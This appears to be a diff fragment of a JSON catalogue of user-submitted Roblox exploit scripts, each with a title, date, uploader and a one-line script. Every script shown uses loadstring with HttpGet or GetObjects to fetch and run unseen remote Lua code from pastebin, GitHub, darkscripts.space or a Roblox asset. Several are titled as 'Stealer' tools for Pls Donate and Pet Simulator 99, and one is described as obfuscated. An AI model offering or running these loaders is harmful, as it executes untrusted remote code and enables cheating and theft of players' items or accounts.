+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://pastebin.com/raw/aaBxGfe7\"))()",
+      "Script_Title": "Blue Lock Rivals",
+      "User_ID": 7554158359,
+      "Username": "icaro_ttf"
+    },
+    "Script2890": {
+      "Date": "December 16 2024",
+      "Description": "Here use|Noclip not work sadly.SORRY THERES NO HIDE UI BUTTON.Maybe already Fixed",
+      "Script": "loadstring(game:GetObjects(\"rbxassetid://4001118261\")[1].Source)()",
+      "Script_Title": "Mm2b0ssjkl0666MyGui",
+      "User_ID": 4321575771,
+      "Username": "shewithepanda"
+    },
+    "Script2891": {
+      "Date": "December 16 2024",
+      "Description": "Here use my script make sure follow me in robloxName:shewithepandaThis is#2Script😊",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/Doggo-cryto/EclipseMM2/master/Script\", true))()",
+      "Script_Title": "Mm2UseJkl0MyGui#2",
+      "User_ID": 4321575771,
+      "Username": "shewithepanda"
+    },
+    "Script2892": {
+      "Date": "December 16 2024",
+      "Description": "Better version",
+      "Script": "loadstring(game:HttpGet('https://darkscripts.space/scripts/b81744e4-ef7f-4093-9fcf-c6536c4b53ec_1174109127849549895.lua',true))()                              ",
+      "Script_Title": "Pls Donate Stealer",
+      "User_ID": 1302544728,
+      "Username": "tigerDan910"
+    },
+    "Script2893": {
+      "Date": "December 16 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet('https://darkscripts.space/scripts/b81744e4-ef7f-4093-9fcf-c6536c4b53ec_1174109127849549895.lua',true))()                                                         ",
+      "Script_Title": "PLS DONATE OP GUI",
+      "User_ID": 5285277741,
+      "Username": "ROROGOPNIK"
+    },
+    "Script2894": {
+      "Date": "December 16 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet('https://darkscripts.space/scripts/f27b715c-5aa5-4209-8c75-bbb960a4e4da_1174109127849549895.lua',true))()                              ",
+      "Script_Title": "PS99 Stealer",
+      "User_ID": 5285277741,
+      "Username": "ROROGOPNIK"
+    },
+    "Script2895": {
+      "Date": "December 16 2024",
+      "Description": "Here By: b0ssjkl0666 Its my gift for you! THIS IS TYCOON GAMES SCRIPT MAYBE WORKING 🙏",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/MadbukScripts/Scripts/main/Obfuscated%20Tycoon%20RNG.lua\"))()",
+      "Script_Title": "Tycoon By:b0ssjkl066",
+      "User_ID": 4321575771,
+      "Username": "shewithepanda"
     }
   }
 }
